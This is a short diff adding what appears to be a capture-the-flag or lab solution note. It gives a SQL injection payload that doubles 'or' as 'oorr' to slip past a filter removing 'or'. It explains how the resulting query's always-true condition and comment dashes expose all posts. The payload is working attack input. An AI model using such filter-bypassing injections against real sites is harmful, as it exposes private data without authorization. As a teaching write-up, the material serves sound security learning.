@@ -1,0 +1,7 @@
+search="' oorr 1=1) -- ('"
+link="now.share/u/evewilson"
+
+first: it's obvious that 'oorr' becomes 'or' because re.sub('or', '', 'oorr') = 'or'
+SQL query: SELECT * FROM posts WHERE (body LIKE '%' or 1=1) -- ('%' OR username LIKE '%' or 1=1) -- ('%') AND share = 'yes';
+After the first double dash (--) everything becomes a comment, so our final query: SELECT * FROM posts WHERE (body LIKE '%' or 1=1)
+and this would return all the posts because the WHERE condition is always true
